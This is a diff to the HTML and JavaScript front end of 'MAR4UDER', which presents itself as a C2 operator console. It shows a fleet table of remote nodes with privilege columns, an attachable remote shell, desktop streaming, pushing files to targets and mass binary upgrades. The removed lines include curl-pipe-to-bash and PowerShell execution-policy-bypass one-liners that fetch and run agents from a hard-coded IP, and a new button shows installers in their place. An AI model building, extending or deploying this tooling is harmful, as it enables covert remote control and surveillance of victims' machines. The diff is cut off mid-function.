@@ -3,308 +3,204 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MAR4UDER // C2 OPERATOR CONSOLE</title>
+<title>MAR4UDER // CLI CONSOLE</title>
 <script type="module" src="/video-stream.js"></script>
 <style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  
   :root {
-    --bg-black: #050505;
-    --bg-pane: #0a0a0a;
-    --border-dark: #222222;
+    --bg-black: #000000;
+    --bg-dark: #0a0a0a;
     --border-red: #ff0033;
-    --border-red-dim: #660014;
-    --red-bright: #ff0033;
-    --red-glow: rgba(255, 0, 51, 0.35);
-    --red-dim: #aa0022;
-    --red-dark: #3a000c;
+    --border-dim: #260007;
+    --border-gray: #222222;
+    --red: #ff0033;
+    --red-glow: rgba(255, 0, 51, 0.4);
     --white: #ffffff;
-    --text-gray: #a0a0a0;
-    --text-dim: #555555;
-    --font-mono: 'JetBrains Mono', 'Fira Code', 'Courier New', Consolas, monospace;
+    --gray: #888888;
+    --gray-dark: #333333;
   }
 
-  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     background: var(--bg-black);
-    color: var(--text-gray);
-    font-family: var(--font-mono);
+    color: var(--gray);
+    font-family: Consolas, 'Courier New', Monaco, monospace;
+    font-size: 12px;
+    line-height: 1.25;
     height: 100vh;
     display: flex;
     flex-direction: column;
     overflow: hidden;
     user-select: none;
-    font-size: 12px;
-    line-height: 1.3;
   }
 
-  /* TOP ASCII HEADER WITH SHIMMERING SINE WAVE */
-  #header-ascii-box {
-    background: var(--bg-pane);
-    border-bottom: 1px solid var(--border-red-dim);
-    padding: 6px 12px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    z-index: 100;
-  }
-
-  #ascii-banner {
-    color: var(--red-bright);
-    font-family: var(--font-mono);
-    font-size: 11px;
-    line-height: 11px;
-    white-space: pre;
-    text-shadow: 0 0 6px var(--red-glow);
-  }
-
-  #ascii-wave-header {
-    color: var(--red-bright);
-    font-size: 11px;
-    line-height: 11px;
-    white-space: pre;
-    font-family: var(--font-mono);
-  }
-
-  .hud-stats {
+  /* FULL WIDTH TERMINAL CONTAINER */
+  #term-app {
+    flex: 1;
     display: flex;
     flex-direction: column;
-    gap: 2px;
-    font-size: 11px;
-    text-align: right;
+    padding: 8px 12px;
+    height: 100vh;
+    gap: 4px;
   }
-  .hud-row {
-    display: flex;
-    justify-content: flex-end;
-    gap: 8px;
-  }
-  .h-val { color: var(--white); font-weight: 700; }
-  .h-red { color: var(--red-bright); font-weight: 700; }
 
-  /* NAVIGATION TABS (CLI STYLE) */
-  #tab-nav {
-    background: #0d0d0d;
-    border-bottom: 1px solid var(--border-dark);
+  /* TOP ASCII HEADER BOX */
+  .ascii-box {
+    border: 1px solid var(--border-red);
+    background: var(--bg-dark);
+    padding: 6px 10px;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    box-shadow: 0 0 10px rgba(255, 0, 51, 0.15);
+  }
+
+  .header-line {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 0 8px;
+    font-weight: 700;
   }
 
-  .tab-list {
+  .brand-text {
+    color: var(--white);
+    letter-spacing: 1px;
+  }
+  .brand-text span {
+    color: var(--red);
+    text-shadow: 0 0 8px var(--red-glow);
+  }
+
+  .stat-badge {
+    color: var(--white);
+  }
+  .stat-badge span {
+    color: var(--red);
+  }
+
+  /* SINE WAVE ASCII DISPLAY */
+  #wave-canvas-pre {
+    color: var(--red);
+    font-family: Consolas, 'Courier New', Monaco, monospace;
+    font-size: 11px;
+    line-height: 11px;
+    white-space: pre;
+    text-shadow: 0 0 4px var(--red-glow);
+  }
+
+  /* TOP MENU NAVIGATION BAR */
+  .cli-nav-bar {
     display: flex;
-    align-items: center;
+    border-top: 1px solid var(--border-gray);
+    padding-top: 4px;
+    gap: 6px;
+    flex-wrap: wrap;
   }
 
-  .tab-item {
-    padding: 6px 12px;
-    color: var(--text-dim);
-    cursor: pointer;
-    border: none;
+  .nav-btn {
     background: transparent;
+    border: 1px solid var(--border-gray);
+    color: var(--gray);
     font-family: inherit;
     font-size: 11px;
-    font-weight: 700;
-    text-transform: uppercase;
-    border-right: 1px solid var(--border-dark);
-  }
-  .tab-item:hover {
-    color: var(--white);
-    background: #141414;
-  }
-  .tab-item.active {
-    color: var(--white);
-    background: var(--red-dark);
-    border-bottom: 2px solid var(--red-bright);
-  }
-
-  .nav-status {
-    font-size: 11px;
-    color: var(--red-bright);
+    padding: 3px 8px;
+    cursor: pointer;
     font-weight: 700;
   }
+  .nav-btn:hover {
+    border-color: var(--red);
+    color: var(--white);
+    background: #150004;
+  }
+  .nav-btn.active {
+    border-color: var(--red);
+    color: var(--white);
+    background: var(--red);
+    color: #000;
+  }
 
-  /* MAIN CLI SPLIT VIEW */
-  #main-cli-view {
+  /* MAIN TERMINAL BODY VIEWPORT */
+  #main-viewport {
     flex: 1;
-    display: grid;
-    grid-template-columns: 380px 1fr;
+    border: 1px solid var(--border-gray);
+    background: var(--bg-black);
+    display: flex;
+    flex-direction: column;
     overflow: hidden;
     position: relative;
   }
 
-  /* LEFT PANE: NODE MATRIX */
-  #left-pane {
-    background: var(--bg-pane);
-    border-right: 1px solid var(--border-dark);
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-  }
-
-  .pane-header {
-    background: #111111;
-    border-bottom: 1px solid var(--border-dark);
-    padding: 4px 8px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    font-size: 11px;
-    font-weight: 700;
-    color: var(--red-bright);
-    text-transform: uppercase;
-  }
-
-  .search-bar {
-    padding: 4px 6px;
-    background: #000;
-    border-bottom: 1px solid var(--border-dark);
-    display: flex;
-    gap: 4px;
-  }
-  .cli-search-input {
-    flex: 1;
-    background: transparent;
-    border: 1px solid var(--border-dark);
-    color: var(--white);
-    font-family: inherit;
-    font-size: 11px;
-    padding: 2px 6px;
-    outline: none;
-  }
-  .cli-search-input:focus {
-    border-color: var(--red-bright);
-  }
-
-  .node-grid {
-    flex: 1;
-    overflow-y: auto;
-    padding: 2px;
-    display: flex;
-    flex-direction: column;
-    gap: 2px;
-  }
-
-  .node-entry {
-    background: #000000;
-    border: 1px solid #181818;
-    padding: 4px 6px;
-    cursor: pointer;
-    font-size: 11px;
-    display: flex;
-    flex-direction: column;
-    gap: 2px;
-    transition: all 0.05s ease;
-  }
-  .node-entry:hover {
-    border-color: var(--border-red-dim);
-    background: #120306;
-  }
-  .node-entry.active {
-    border-color: var(--red-bright);
-    background: var(--red-dark);
-    box-shadow: inset 3px 0 0 var(--red-bright);
-  }
-
-  .ne-top {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-  }
-  .ne-slot { color: var(--red-bright); font-weight: 700; }
-  .ne-host { color: var(--white); font-weight: 700; margin-left: 4px; }
-  .ne-online { color: var(--red-bright); font-weight: 700; }
-  .ne-offline { color: var(--text-dim); }
-
-  .ne-bot {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    color: var(--text-dim);
-    font-size: 10px;
-  }
-  .ne-root { color: var(--red-bright); font-weight: 700; }
-
-  /* RIGHT PANE: WORKSPACE TERMINAL */
-  #right-pane {
-    background: #000000;
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-  }
-
-  .tab-page {
+  .view-pane {
     flex: 1;
     display: none;
     flex-direction: column;
     overflow: hidden;
-    position: relative;
+    padding: 8px 10px;
   }
-  .tab-page.active {
+  .view-pane.active {
     display: flex;
   }
 
-  /* PAGE 1: PTY TERMINAL CONSOLE */
-  #terminal-container {
+  /* PANE 1: NODES TABLE */
+  .table-header {
+    color: var(--red);
+    font-weight: 700;
+    border-bottom: 1px solid var(--border-gray);
+    padding-bottom: 4px;
+    margin-bottom: 4px;
+    display: grid;
+    grid-template-columns: 50px 180px 160px 140px 120px 90px 1fr;
+  }
+
+  .node-rows-scroll {
+    flex: 1;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .table-row {
+    display: grid;
+    grid-template-columns: 50px 180px 160px 140px 120px 90px 1fr;
+    padding: 3px 0;
+    cursor: pointer;
+    border-bottom: 1px dotted #151515;
+    color: #ccc;
+  }
+  .table-row:hover {
+    background: #150004;
+    color: var(--white);
+  }
+  .table-row.selected {
+    background: #250007;
+    color: var(--white);
+    border-left: 2px solid var(--red);
+    padding-left: 4px;
+  }
+
+  .r-slot { color: var(--red); font-weight: 700; }
+  .r-id { color: var(--white); font-weight: 700; }
+  .r-online { color: var(--red); font-weight: 700; }
+  .r-offline { color: var(--gray-dark); }
+  .r-root { color: var(--red); font-weight: 700; }
+
+  /* PANE 2: INTERACTIVE PTY SCREEN */
+  #pty-terminal-screen {
     flex: 1;
     background: #000000;
-    padding: 8px 10px;
     overflow-y: auto;
-    font-family: var(--font-mono);
+    font-family: inherit;
     font-size: 12px;
-    line-height: 1.4;
-    color: #e0e0e0;
+    line-height: 1.35;
+    color: #eaeaea;
     white-space: pre-wrap;
     word-break: break-all;
     outline: none;
   }
 
-  .terminal-cmd-bar {
-    background: var(--bg-pane);
-    border-top: 1px solid var(--border-dark);
-    padding: 4px 8px;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-  }
-  .cli-prompt {
-    color: var(--red-bright);
-    font-weight: 700;
-    white-space: nowrap;
-  }
-  .cli-cmd-input {
-    flex: 1;
-    background: #000;
-    border: 1px solid var(--border-dark);
-    color: var(--white);
-    font-family: inherit;
-    font-size: 12px;
-    padding: 4px 6px;
-    outline: none;
-  }
-  .cli-cmd-input:focus {
-    border-color: var(--red-bright);
-  }
-
-  .macro-buttons {
-    display: flex;
-    gap: 4px;
-  }
-  .btn-macro {
-    background: #111;
-    border: 1px solid var(--border-dark);
-    color: var(--text-gray);
-    font-family: inherit;
-    font-size: 10px;
-    padding: 3px 6px;
-    cursor: pointer;
-  }
-  .btn-macro:hover {
-    border-color: var(--red-bright);
-    color: var(--white);
-    background: var(--red-dark);
-  }
-
-  /* PAGE 2: VIDEO STREAM */
-  #stream-viewport-box {
+  /* PANE 3: DESKTOP STREAM VIEWPORT */
+  #stream-box-container {
     flex: 1;
     background: #000000;
     display: flex;
@@ -325,528 +221,506 @@
     object-fit: contain;
   }
 
-  /* PAGE 3: FILE MANAGER */
-  .file-cli-grid {
+  /* PANE 4: FILE EXPLORER */
+  .files-console-grid {
     flex: 1;
     display: grid;
     grid-template-columns: 1fr 1fr;
-    gap: 8px;
-    padding: 8px;
+    gap: 10px;
     overflow: hidden;
   }
-  .file-box {
-    background: var(--bg-pane);
-    border: 1px solid var(--border-dark);
+  .fc-box {
+    border: 1px solid var(--border-gray);
+    background: var(--bg-dark);
+    padding: 8px;
     display: flex;
     flex-direction: column;
-    padding: 8px;
     gap: 6px;
     overflow: hidden;
   }
-  .file-list-view {
+  .fc-list {
     flex: 1;
-    background: #000;
-    border: 1px solid var(--border-dark);
     overflow-y: auto;
+    background: #000;
+    border: 1px solid #1a1a1a;
     padding: 4px;
     display: flex;
     flex-direction: column;
     gap: 2px;
   }
-  .fl-item {
-    padding: 3px 6px;
-    font-size: 11px;
-    display: flex;
-    justify-content: space-between;
-    border-bottom: 1px solid #151515;
-  }
 
-  /* PAGE 4: OPS / TELEMETRY */
-  .ops-grid {
+  /* PANE 5: TOOLS & DIAGNOSTICS */
+  .tools-console {
     flex: 1;
-    padding: 10px;
     display: flex;
     flex-direction: column;
     gap: 8px;
+    overflow: hidden;
   }
-  .ops-actions {
-    display: flex;
-    gap: 6px;
-    flex-wrap: wrap;
-  }
-  .ops-log {
+  .tools-log-view {
     flex: 1;
     background: #000;
-    border: 1px solid var(--border-dark);
+    border: 1px solid var(--border-gray);
     padding: 8px;
-    font-size: 11px;
-    color: var(--text-gray);
     overflow-y: auto;
     white-space: pre-wrap;
+    color: var(--white);
   }
 
-  /* FOOTER */
-  footer {
-    background: var(--bg-pane);
-    border-top: 1px solid var(--border-dark);
-    padding: 4px 10px;
+  /* BOTTOM COMMAND PROMPT BAR */
+  .prompt-bar {
+    border: 1px solid var(--border-red);
+    background: var(--bg-dark);
+    padding: 4px 8px;
     display: flex;
     align-items: center;
-    justify-content: space-between;
-    font-size: 10px;
-    color: var(--text-dim);
+    gap: 6px;
   }
-  .key-legend {
-    display: flex;
-    gap: 12px;
-  }
-  .k-badge {
-    color: var(--red-bright);
+
+  .p-label {
+    color: var(--red);
     font-weight: 700;
+    white-space: nowrap;
   }
 
-  /* MODAL */
-  .cli-modal-bg {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.85);
-    z-index: 1000;
-    display: none;
-    align-items: center;
-    justify-content: center;
+  .cli-input-line {
+    flex: 1;
+    background: transparent;
+    border: none;
+    color: var(--white);
+    font-family: inherit;
+    font-size: 12px;
+    outline: none;
   }
-  .cli-modal-bg.open {
+
+  .macro-inline {
     display: flex;
+    gap: 4px;
   }
-  .modal-cli-box {
-    background: #0a0a0a;
-    border: 1px solid var(--red-bright);
-    box-shadow: 0 0 15px var(--red-glow);
-    width: 580px;
-    max-width: 90vw;
-    padding: 12px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
+  .m-btn {
+    background: #111;
+    border: 1px solid var(--border-gray);
+    color: var(--gray);
+    font-family: inherit;
+    font-size: 10px;
+    padding: 2px 5px;
+    cursor: pointer;
   }
-  .snippet-text {
-    background: #000;
-    border: 1px solid var(--border-dark);
-    padding: 6px 8px;
-    color: var(--red-bright);
-    font-size: 11px;
-    user-select: all;
+  .m-btn:hover {
+    border-color: var(--red);
+    color: var(--white);
   }
 </style>
 </head>
 <body>
 
-<!-- TOP ASCII HEADER -->
-<div id="header-ascii-box">
-  <div id="ascii-banner">
-███╗   ███╗ █████╗ ██████╗ ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
-████╗ ████║██╔══██╗██╔══██╗██║  ██║██║   ██║██╔══██╗██╔════╝██╔══██╗
-██╔████╔██║███████║██████╔╝███████║██║   ██║██║  ██║█████╗  ██████╔╝
-██║╚██╔╝██║██╔══██║██╔══██╗╚════██║██║   ██║██║  ██║██╔══╝  ██╔══██╗
-██║ ╚═╝ ██║██║  ██║██║  ██║     ██║╚██████╔╝██████╔╝███████╗██║  ██║
-  </div>
+<div id="term-app">
 
-  <div id="ascii-wave-header">
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-^~*+::=-.░▒▓███▓▒░.-=::+*~^~*+::=-.░▒▓███▓▒░.-=::+
-==================================================
-  </div>
-
-  <div class="hud-stats">
-    <div class="hud-row">NODES: <span class="h-red" id="hud-online">0</span> / <span class="h-val" id="hud-total">0</span> ONLINE</div>
-    <div class="hud-row">UPTIME: <span class="h-val" id="hud-uptime">0h 0m</span></div>
-    <div class="hud-row">TRAFFIC: <span class="h-val" id="hud-traffic">TX 0 KB / RX 0 KB</span></div>
-  </div>
-</div>
-
-<!-- NAVIGATION TABS -->
-<div id="tab-nav">
-  <div class="tab-list">
-    <button class="tab-item active" onclick="switchTab(1)">[1] PTY TERMINAL</button>
-    <button class="tab-item" onclick="switchTab(2)">[2] VIDEO STREAM</button>
-    <button class="tab-item" onclick="switchTab(3)">[3] FILE MANAGER</button>
-    <button class="tab-item" onclick="switchTab(4)">[4] OPS & DIAGNOSTICS</button>
-  </div>
-  <div class="nav-status" id="active-target-badge">[NO NODE SELECTED]</div>
-</div>
-
-<!-- MAIN CLI SPLIT -->
-<div id="main-cli-view">
-  
-  <!-- LEFT: NODE MATRIX -->
-  <div id="left-pane">
-    <div class="pane-header">
-      <div>NODE MATRIX // FLEET</div>
-      <div id="pane-node-count">[0 NODES]</div>
+  <!-- TOP HEADER BOX -->
+  <div class="ascii-box">
+    <div class="header-line">
+      <div class="brand-text">MAR4UDER // <span>C2 OPERATOR CONSOLE</span> [RELAY PROTOCOL v2.1]</div>
+      <div class="stat-badge">NODES: <span id="s-online">0</span>/<span id="s-total">0</span> ONLINE</div>
+      <div class="stat-badge">UPTIME: <span id="s-uptime">0h 0m</span></div>
+      <div class="stat-badge">NET: <span id="s-traffic">TX 0 KB / RX 0 KB</span></div>
     </div>
-    <div class="search-bar">
-      <input type="text" class="cli-search-input" id="node-search" placeholder="Filter ID / IP / Hostname..." oninput="renderNodes()">
-    </div>
-    <div class="node-grid" id="node-grid-container">
-      <!-- Populated via JS -->
+
+    <!-- DYNAMIC ASCII WAVE BAR -->
+    <pre id="wave-canvas-pre">
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+^~*+::=-.░▒▓████████▓▒░.-=::+*~^~*+::=-.░▒▓████████▓▒░.-=::+*~^~*+::=-.░▒▓████████▓▒░.-=::+*~^~*+::=-.░▒▓████████▓▒░.-=
+========================================================================================================================</pre>
+
+    <!-- NAV BAR -->
+    <div class="cli-nav-bar">
+      <button class="nav-btn active" onclick="switchView('nodes')">[F1] FLEET MATRIX</button>
+      <button class="nav-btn" onclick="switchView('shell')">[F2] ATTACH SHELL</button>
+      <button class="nav-btn" onclick="switchView('stream')">[F3] DESKTOP STREAM</button>
+      <button class="nav-btn" onclick="switchView('files')">[F4] FILE MANAGER</button>
+      <button class="nav-btn" onclick="switchView('tools')">[F5] TOOLS & UPDATER</button>
+      <button class="nav-btn" onclick="runCommandDirect('help')">[?] HELP</button>
+      <div style="flex: 1;"></div>
+      <div style="color: var(--red); font-weight: 700;" id="active-target-txt">[NO TARGET SELECTED]</div>
     </div>
   </div>
 
-  <!-- RIGHT: CLI WORKSPACE -->
-  <div id="right-pane">
+  <!-- MAIN VIEWPORT -->
+  <div id="main-viewport">
     
-    <!-- PAGE 1: PTY TERMINAL -->
-    <div class="tab-page active" id="page-term">
-      <div id="terminal-container" tabindex="0">Connecting to PTY terminal stream...</div>
-      <div class="terminal-cmd-bar">
-        <div class="cli-prompt" id="term-prompt">m4r:c2></div>
-        <input type="text" class="cli-cmd-input" id="cli-cmd-field" placeholder="Enter shell command or macro..." onkeydown="handleCliInput(event)">
-        <div class="macro-buttons">
-          <button class="btn-macro" onclick="sendTerminalCommand('id\n')">id</button>
-          <button class="btn-macro" onclick="sendTerminalCommand('uname -a\n')">uname</button>
-          <button class="btn-macro" onclick="sendTerminalCommand('ps aux | head -20\n')">ps</button>
-          <button class="btn-macro" onclick="sendTerminalCommand('ss -tulnp\n')">ports</button>
-          <button class="btn-macro" onclick="sendTerminalCommand('df -h\n')">df</button>
-          <button class="btn-macro" onclick="sendTerminalCommand('\x03')">Ctrl+C</button>
-          <button class="btn-macro" onclick="clearTerminal()">Clear</button>
+    <!-- VIEW 1: FLEET MATRIX -->
+    <div class="view-pane active" id="view-nodes">
+      <div class="table-header">
+        <div>[#]</div>
+        <div>[NODE ID]</div>
+        <div>[REMOTE IP]</div>
+        <div>[USER / PRIV]</div>
+        <div>[OS / ARCH]</div>
+        <div>[PING]</div>
+        <div>[STATUS]</div>
+      </div>
+      <div class="node-rows-scroll" id="node-table-body">
+        <!-- Rows populated dynamically -->
+      </div>
+    </div>
+
+    <!-- VIEW 2: SHELL -->
+    <div class="view-pane" id="view-shell">
+      <div id="pty-terminal-screen" tabindex="0">[*] Select a node and press [F2] or type '1' / 'attach <#>' to connect...</div>
+    </div>
+
+    <!-- VIEW 3: STREAM -->
+    <div class="view-pane" id="view-stream">
+      <div id="stream-box-container">
+        <div style="color: var(--gray-dark);">[!] Select an active node to initialize video stream</div>
+      </div>
+    </div>
+
+    <!-- VIEW 4: FILES -->
+    <div class="view-pane" id="view-files">
+      <div class="files-console-grid">
+        <div class="fc-box">
+          <div style="color: var(--red); font-weight: 700;">[+] PUSH FILE TO REMOTE NODE</div>
+          <input type="text" class="cli-input-line" id="inp-dest-file" value="/tmp/agent_data" style="border: 1px solid var(--border-gray); padding: 4px;">
+          <input type="file" id="inp-file-upload" style="font-size: 11px;">
+          <button class="nav-btn" style="border-color: var(--red); color: var(--white);" onclick="pushFile()">[+] UPLOAD & TRANSFER</button>
+          <div id="file-resp-log" style="color: var(--red); font-size: 11px;"></div>
+        </div>
+        <div class="fc-box">
+          <div style="color: var(--red); font-weight: 700;">[*] SERVER FILE REPOSITORY</div>
+          <div class="fc-list" id="repo-list-container">Loading files...</div>
         </div>
       </div>
     </div>
 
-    <!-- PAGE 2: VIDEO STREAM -->
-    <div class="tab-page" id="page-stream">
-      <div id="stream-viewport-box">
-        <div style="color: var(--text-dim); font-size: 11px;">[!] Select online node to initialize video stream</div>
-      </div>
-    </div>
-
-    <!-- PAGE 3: FILES -->
-    <div class="tab-page" id="page-files">
-      <div class="file-cli-grid">
-        <div class="file-box">
-          <div style="font-weight: 700; color: var(--red-bright); font-size: 11px;">PUSH FILE TO TARGET NODE</div>
-          <input type="text" class="cli-cmd-input" id="file-remote-path" placeholder="Remote path: /tmp/agent_bin" value="/tmp/agent_bin">
-          <input type="file" id="file-select-input" style="font-size: 11px; color: var(--text-dim);">
-          <button class="btn-macro" style="border-color: var(--red-bright); color: var(--white);" onclick="pushFileToTarget()">[+] UPLOAD & PUSH</button>
-          <div id="file-status-text" style="font-size: 10px; color: var(--red-bright);"></div>
+    <!-- VIEW 5: TOOLS -->
+    <div class="view-pane" id="view-tools">
+      <div class="tools-console">
+        <div style="display: flex; gap: 6px; flex-wrap: wrap;">
+          <button class="nav-btn" onclick="runTool('ping')">[!] PING TARGET</button>
+          <button class="nav-btn" onclick="runTool('update')">[!] UPGRADE TARGET BINARY</button>
+          <button class="nav-btn" onclick="runTool('update-all')">[!!] MASS UPGRADE ALL NODES</button>
+          <button class="nav-btn" onclick="runTool('deploy')">[+] SHOW 1-LINE INSTALLERS</button>
+          <button class="nav-btn" style="border-color: #550011;" onclick="runTool('uninstall')">[X] UNINSTALL AGENT</button>
         </div>
-        <div class="file-box">
-          <div style="font-weight: 700; color: var(--red-bright); font-size: 11px;">SERVER REPOSITORY</div>
-          <div class="file-list-view" id="server-files-container">Loading repository files...</div>
-        </div>
-      </div>
-    </div>
-
-    <!-- PAGE 4: OPS -->
-    <div class="tab-page" id="page-ops">
-      <div class="ops-grid">
-        <div style="font-weight: 700; color: var(--red-bright); font-size: 11px;">FLEET & TARGET MANAGEMENT</div>
-        <div class="ops-actions">
-          <button class="btn-macro" onclick="pingActiveTarget()">[!] PING TARGET</button>
-          <button class="btn-macro" onclick="updateActiveTarget()">[!] UPGRADE BINARY</button>
-          <button class="btn-macro" onclick="updateAllNodes()">[!!] UPGRADE ALL NODES</button>
-          <button class="btn-macro" onclick="openDeployModal()">[+] GET ONE-LINERS</button>
-          <button class="btn-macro" style="border-color: #660014;" onclick="uninstallActiveTarget()">[X] UNINSTALL AGENT</button>
-        </div>
-        <div class="ops-log" id="ops-log-output">// Operations telemetry log...</div>
+        <div class="tools-log-view" id="tools-output-box">// Operations log output...</div>
       </div>
     </div>
 
   </div>
-</div>
 
-<!-- FOOTER -->
-<footer>
-  <div class="key-legend">
-    <div><span class="k-badge">[1..4]</span> Switch Tab</div>
-    <div><span class="k-badge">[Ctrl+C]</span> Interrupt</div>
-    <div><span class="k-badge">[F5/R]</span> Refresh Roster</div>
-  </div>
-  <div>MAR4UDER C2 RELAY // OPERATOR CONSOLE</div>
-</footer>
-
-<!-- MODAL -->
-<div class="cli-modal-bg" id="deploy-modal">
-  <div class="modal-cli-box">
-    <div style="display: flex; justify-content: space-between; border-bottom: 1px solid var(--border-dark); padding-bottom: 4px;">
-      <div style="color: var(--red-bright); font-weight: 700;">AGENT DEPLOYMENT ONE-LINERS</div>
-      <button class="btn-macro" onclick="closeDeployModal()">[X]</button>
+  <!-- BOTTOM COMMAND PROMPT -->
+  <div class="prompt-bar">
+    <div class="p-label" id="cli-prompt-label">m4r:operator></div>
+    <input type="text" class="cli-input-line" id="cli-input" placeholder="Type command (e.g. '1', 'attach 1', 'exec 1 id', 'ping 1', 'help')..." onkeydown="handlePromptKey(event)">
+    <div class="macro-inline">
+      <button class="m-btn" onclick="sendPtyKey('id\n')">id</button>
+      <button class="m-btn" onclick="sendPtyKey('uname -a\n')">uname</button>
+      <button class="m-btn" onclick="sendPtyKey('ps aux | head -20\n')">ps</button>
+      <button class="m-btn" onclick="sendPtyKey('ss -tulnp\n')">ports</button>
+      <button class="m-btn" onclick="sendPtyKey('df -h\n')">df</button>
+      <button class="m-btn" onclick="sendPtyKey('\x03')">^C</button>
+      <button class="m-btn" onclick="clearScreen()">Clear</button>
     </div>
-    <div style="font-size: 10px; color: var(--text-dim);">Linux Agent (One-Line Curl):</div>
-    <div class="snippet-text" id="snip-linux">curl -s http://104.143.206.163:8080/i | bash</div>
-    <div style="font-size: 10px; color: var(--text-dim);">Operator Admin CLI (m4r):</div>
-    <div class="snippet-text" id="snip-m4r">curl -s http://104.143.206.163:8080/m4r | bash</div>
-    <div style="font-size: 10px; color: var(--text-dim);">Windows Powershell:</div>
-    <div class="snippet-text" id="snip-ps">powershell -ep bypass -c "iwr -useb http://104.143.206.163:8080/m4r.ps1 | iex"</div>
   </div>
+
 </div>
 
 <script>
   let nodes = [];
   let selectedNode = null;
   let termWS = null;
-  let currentTab = 1;
+  let currentView = 'nodes';
 
-  // DYNAMIC ASCII SINE WAVE ANIMATION IN HEADER
-  const waveEl = document.getElementById('ascii-wave-header');
-  const waveSymbols = ['~', '^', '*', '+', ':', '-', '=', '.', '░', '▒', '▓', '█'];
-  let waveTick = 0;
-  function updateAsciiWave() {
-    const cols = 50;
-    let l1 = '', l2 = '', l3 = '';
-    for (let i = 0; i < cols; i++) {
-      const v1 = Math.sin(i * 0.18 + waveTick);
-      const v2 = Math.cos(i * 0.22 - waveTick * 0.8);
-      const v3 = Math.sin(i * 0.15 + waveTick * 1.2);
-      
-      const idx1 = Math.floor(Math.abs(v1) * waveSymbols.length) % waveSymbols.length;
-      const idx2 = Math.floor(Math.abs(v2) * waveSymbols.length) % waveSymbols.length;
-      const idx3 = Math.floor(Math.abs(v3) * waveSymbols.length) % waveSymbols.length;
-      
-      l1 += waveSymbols[idx1];
-      l2 += waveSymbols[idx2];
-      l3 += waveSymbols[idx3];
+  // DYNAMIC SINE WAVE GENERATOR
+  const wavePre = document.getElementById('wave-canvas-pre');
+  const waveChars = ['~', '^', '*', '+', ':', '-', '=', '.', '░', '▒', '▓', '█'];
+  let waveStep = 0;
+  function animateWave() {
+    const width = 120;
+    let line1 = '', line2 = '', line3 = '';
+    for (let i = 0; i < width; i++) {
+      const v1 = Math.sin(i * 0.12 + waveStep);
+      const v2 = Math.cos(i * 0.18 - waveStep * 0.7);
+      const v3 = Math.sin(i * 0.14 + waveStep * 1.3);
+
+      const c1 = waveChars[Math.floor(Math.abs(v1) * waveChars.length) % waveChars.length];
+      const c2 = waveChars[Math.floor(Math.abs(v2) * waveChars.length) % waveChars.length];
+      const c3 = waveChars[Math.floor(Math.abs(v3) * waveChars.length) % waveChars.length];
+
+      line1 += c1;
+      line2 += c2;
+      line3 += c3;
     }
-    waveEl.innerText = `${l1}\n${l2}\n${l3}`;
-    waveTick += 0.08;
-    requestAnimationFrame(updateAsciiWave);
+    wavePre.innerText = `${line1}\n${line2}\n${line3}`;
+    waveStep += 0.05;
+    requestAnimationFrame(animateWave);
   }
-  updateAsciiWave();
+  animateWave();
 
-  // REFRESH DATA
-  async function refreshData() {
+  // DATA FETCHING
+  async function refreshAll() {
     try {
-      const [resNodes, resStats] = await Promise.all([
+      const [rNodes, rStats] = await Promise.all([
         fetch('/api/v1/nodes'),
         fetch('/api/v1/stats')
       ]);
-      if (resNodes.ok) {
-        nodes = await resNodes.json();
-        renderNodes();
+      if (rNodes.ok) {
+        nodes = await rNodes.json();
+        renderTable();
       }
-      if (resStats.ok) {
-        const stats = await resStats.json();
-        document.getElementById('hud-uptime').innerText = Math.floor(stats.uptime_sec / 3600) + 'h ' + Math.floor((stats.uptime_sec % 3600)/60) + 'm';
-        document.getElementById('hud-traffic').innerText = `TX ${(stats.out_bytes / 1024).toFixed(0)} KB / RX ${(stats.in_bytes / 1024).toFixed(0)} KB`;
+      if (rStats.ok) {
+        const stats = await rStats.json();
+        document.getElementById('s-uptime').innerText = Math.floor(stats.uptime_sec / 3600) + 'h ' + Math.floor((stats.uptime_sec % 3600)/60) + 'm';
+        document.getElementById('s-traffic').innerText = `TX ${(stats.out_bytes / 1024).toFixed(0)} KB / RX ${(stats.in_bytes / 1024).toFixed(0)} KB`;
       }
-    } catch(e) {
-      console.error(e);
-    }
+    } catch(e) {}
   }
 
-  function renderNodes() {
-    const container = document.getElementById('node-grid-container');
+  function renderTable() {
+    const container = document.getElementById('node-table-body');
     container.innerHTML = '';
-    const search = document.getElementById('node-search').value.toLowerCase();
-    
-    let onlineCount = 0;
-    nodes.forEach(n => {
-      if (n.is_online) onlineCount++;
-    });
-    document.getElementById('hud-online').innerText = onlineCount;
-    document.getElementById('hud-total').innerText = nodes.length;
-    document.getElementById('pane-node-count').innerText = `[${nodes.length} NODES]`;
+    let onCount = 0;
+    nodes.forEach(n => { if (n.is_online) onCount++; });
+    document.getElementById('s-online').innerText = onCount;
+    document.getElementById('s-total').innerText = nodes.length;
 
-    const filtered = nodes.filter(n => {
-      if (search && !n.id.toLowerCase().includes(search) && !n.hostname.toLowerCase().includes(search) && !n.ip.toLowerCase().includes(search)) return false;
-      return true;
-    });
-
-    filtered.forEach(n => {
+    nodes.forEach((n, idx) => {
       const row = document.createElement('div');
-      row.className = 'node-entry' + (selectedNode && selectedNode.id === n.id ? ' active' : '');
+      const isSel = selectedNode && selectedNode.id === n.id;
+      row.className = 'table-row' + (isSel ? ' selected' : '');
